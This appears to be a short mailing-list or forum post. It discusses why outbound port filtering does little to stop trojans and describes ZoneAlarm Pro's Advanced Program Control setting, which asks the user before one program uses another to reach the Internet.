This is also of course an issue for network-level firewalls.  Allowing
outgoing traffic only on well-known ports such as 80, 443, etc. is to a
large extent false security, since there's no reason a trojan or other
malicious program can't utilize those ports and protocols.

ZoneAlarm Pro (the pay version) has an additional feature which defeats
this.  You need to turn on "Advanced Program Control", either by setting the
"Program Control" slider to "High" (meaning you'll have to OK every Internet
access by a DLL as well as by a program's core code) or by leaving it at
"Medium" and clicking "Enable Advanced Program Control" on the "Custom"
dialog.

What that feature does is require your permission each time one program
tries to use another to access the 'net.  You'll get a popup like:

    Do you want to allow MaliciousTrojan.exe to use Internet Explorer to
    access the Internet?

Way too impractical to even consider.
